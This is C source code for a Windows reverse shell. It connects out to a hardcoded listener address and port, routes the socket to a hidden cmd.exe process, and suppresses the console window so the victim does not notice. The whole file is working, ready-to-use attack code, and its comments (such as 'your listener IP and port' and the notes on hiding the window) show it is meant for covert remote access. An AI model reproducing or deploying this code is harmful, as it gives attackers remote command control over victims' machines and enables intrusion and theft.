#include <winsock2.h>
#include <stdio.h>

// Adding windows.h and process.h for CREATE_NO_WINDOW flag
#include <windows.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main(int argc, char *argv[])
{
    // your listener IP and port
    strncpy(ip_addr, "192.168.100.25", 15);
    int port = 8080;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr =inet_addr(ip_addr);
    
// connecting
    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));

    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // Add STARTF_USESHOWWINDOW flag
    ini_processo.wShowWindow = SW_HIDE; // Add SW_HIDE to hide the window
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // starting cmd.exe with CREATE_NO_WINDOW flag
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
